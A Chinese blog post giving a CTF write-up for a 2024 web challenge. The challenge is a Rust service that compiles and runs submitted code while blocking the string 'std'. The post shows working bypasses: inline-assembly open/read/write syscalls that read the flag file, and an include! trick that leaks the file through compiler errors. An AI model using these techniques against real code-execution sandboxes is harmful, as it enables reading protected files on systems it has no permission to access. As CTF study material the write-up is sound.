---
title: rust下嵌入汇编代码
id: aa0a5e3c-19e0-4cc3-84dd-dfe2c5895328
date: 2024-04-09 20:22:33
auther: yrl
cover: 
excerpt: rust下shellcode编写 2024红明谷杯一道web题，playground： use stdfs;use stdfsFile;use stdioWrite;use stdprocessCommand;use randRng;#[get("/")]
permalink: /archives/rust%E6%B1%87%E7%BC%96
categories:
 - 汇编
 - rust
tags: 
 - 汇编
---

# rust下shellcode编写

2024红明谷杯一道web题，playground：
```rust
use std::fs;
use std::fs::File;
use std::io::Write;
use std::process::Command;
use rand::Rng;

#[get("/")]
fn index() -> String {
    fs::read_to_string("main.rs").unwrap_or(String::default())
}

#[post("/rust_code", data = "<code>")]
fn run_rust_code(code: String) -> String{
    if code.contains("std") {
        return "Error: std is not allowed".to_string();
    }
    //generate a random 5 length file name
    let file_name = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(5)
        .map(char::from)
        .collect::<String>();
    if let Ok(mut file) = File::create(format!("playground/{}.rs", &file_name)) {
        file.write_all(code.as_bytes());
    }
    if let Ok(build_output) = Command::new("rustc")
        .arg(format!("playground/{}.rs",&file_name))
        .arg("-C")
        .arg("debuginfo=0")
        .arg("-C")
        .arg("opt-level=3")
        .arg("-o")
        .arg(format!("playground/{}",&file_name))
        .output() {
        if !build_output.status.success(){
            fs::remove_file(format!("playground/{}.rs",&file_name));
            return String::from_utf8_lossy(build_output.stderr.as_slice()).to_string();
        }
    }
    fs::remove_file(format!("playground/{}.rs",&file_name));
    if let Ok(output) = Command::new(format!("playground/{}",&file_name))
        .output() {
        if !output.status.success(){
            fs::remove_file(format!("playground/{}",&file_name));
            return String::from_utf8_lossy(output.stderr.as_slice()).to_string();
        } else{
            fs::remove_file(format!("playground/{}",&file_name));
            return String::from_utf8_lossy(output.stdout.as_slice()).to_string();
        }
    }
    return String::default();

}

#[launch]
fn rocket() -> _ {
    let figment = rocket::Config::figment()
        .merge(("address", "0.0.0.0"));
    rocket::custom(figment).mount("/", routes![index,run_rust_code])
}
```
rust写的一个接口，可以实现将rust代码编译运行，但是通过接口代码逻辑可知，过滤了基本库std，所以要用rust汇编实现orw来进行读取flag，正解应该如下：
```rust
fn main() {
    let mut buf = [0u8; 1024];
    let filename = "./flag\x00";
    let fd: i32;
    let count: usize;
    unsafe {
        // open 系统调用
        core::arch::asm!(
            "syscall",
            in("rax") 2, // sys_open
            in("rdi") filename.as_ptr(),
            in("rsi") 0, // flags (O_RDONLY)
            lateout("rax") fd,
        );
        // 检查文件描述符是否有效
        if fd >= 0 {
            // read 系统调用
            core::arch::asm!(
                "syscall",
                in("rax") 0, // sys_read
                in("rdi") fd,
                in("rsi") buf.as_mut_ptr(),
                in("rdx") buf.len(),
                lateout("rax") count,
            );
            // write 系统调用，将读取的内容写到标准输出
            core::arch::asm!(
                "syscall",
                in("rax") 1, // sys_write
                in("rdi") 1, //
                in("rsi") buf.as_ptr(),
                in("rdx") count,
            );
        }
    }
}
// rustc exp.rs -C debuginfo=0 -C opt-level=3 -o exp
```

```shell
➜  2024hmgctf ./exp
flag{757c49bf191840599e8921fb6fd3df09}
```
还有一种解法应该是非预期，用`include!("/flag");`编译报错的方式将flag带出来

```shell
➜  2024hmgctf ./exp
error: macros that expand to items must be delimited with braces or followed by a semicolon
 --> exp1.rs:1:9
  |
1 | include!("./flag")
  |         ^^^^^^^^^^
  |
help: change the delimiters to curly braces
  |
1 | include!{"./flag"}
  |         ~        ~
help: add a semicolon
  |
1 | include!("./flag");
  |                   +

error: expected one of `!` or `::`, found `{`
 --> ./flag:1:5
  |
1 | flag{757c49bf191840599e8921fb6fd3df09}
  |     ^ expected one of `!` or `::`

error[E0601]: `main` function not found in crate `exp1`
 --> exp1.rs:1:19
  |
1 | include!("./flag")
  |                   ^ consider adding a `main` function to `exp1.rs`

error: aborting due to 3 previous errors
```